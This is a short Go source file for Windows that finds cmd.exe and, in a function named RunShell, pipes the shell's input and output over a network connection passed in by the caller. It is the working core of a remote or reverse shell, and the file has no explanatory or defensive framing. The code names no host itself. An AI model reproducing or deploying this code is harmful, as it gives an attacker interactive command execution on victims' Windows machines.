// +build windows

package main

import (
    "net"
    "os/exec"
    "io"
)

const (
    commandPrompt = "C:\\Windows\\System32\\cmd.exe"
    //powerShell    = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
)

func GetSystemShell() string {
    //if exists(powerShell) {
    //    return powerShell
    //}
    return commandPrompt
}

func RunShell(conn net.Conn, cmd *exec.Cmd) {
    stdin, _ := cmd.StdinPipe()
    stdout, _ := cmd.StdoutPipe()
    stderr, _ := cmd.StderrPipe()
    
    cmd.Start()
    
    go func() {
        io.Copy(stdin, conn)
    }()
    
    go func() {
        io.Copy(conn, stdout)
    }()
    
    io.Copy(conn, stderr)
}
